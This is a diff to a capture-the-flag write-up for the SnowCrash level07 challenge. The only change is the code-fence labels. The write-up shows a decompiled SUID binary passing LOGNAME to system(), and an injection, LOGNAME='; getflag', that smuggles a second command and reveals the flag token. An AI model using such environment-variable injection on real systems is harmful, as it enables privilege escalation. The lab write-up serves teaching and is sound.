@@ -4,7 +4,7 @@
 
 - `level07` is an execuable belonging to `flag07` with SUID and SGID bits set.
 
-```
+```console
 level07@SnowCrash:~$ ls -al
 total 24
 dr-x------ 1 level07 level07  120 Mar  5  2016 .
@@ -19,7 +19,7 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 
 - Decompiling the file using [dogbolt](https://dobgolt.com) show the following code:
 
-```
+```console
 logName = getenv("LOGNAME");
 asprintf(&cmd,"/bin/echo %s ", logName);
 return system(cmd);
@@ -27,7 +27,7 @@ return system(cmd);
 
 ## Environment Variable Injection
 
-```
+```console
 level07@SnowCrash:~$ LOGNAME="; getflag" ./level07
 
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
